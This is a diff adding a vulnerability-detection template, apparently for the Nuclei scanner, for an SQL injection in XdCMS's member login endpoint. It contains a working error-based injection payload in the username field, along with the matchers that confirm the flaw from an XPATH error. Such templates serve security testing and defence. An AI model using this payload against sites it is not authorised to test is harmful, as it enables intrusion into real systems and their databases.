@@ -1,0 +1,31 @@
+id: xdcms-sqli
+info:
+  author: pikpikcu
+  name: XdCMS SQL Injection
+  reference: https://www.uedbox.com/post/35188/
+  severity: high
+  tags: sqli,xdcms
+requests:
+- body: 'username=dd'' or extractvalue(0x0a,concat(0x0a,810663301*872821376))#&password=dd&submit=+%B5%C7+%C2%BC+
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers:
+  - part: header
+    type: word
+    words:
+    - 'Content-Type: text/html'
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '707564257851522176'
+    - 'XPATH syntax error:'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/index.php?m=member&f=login_save'
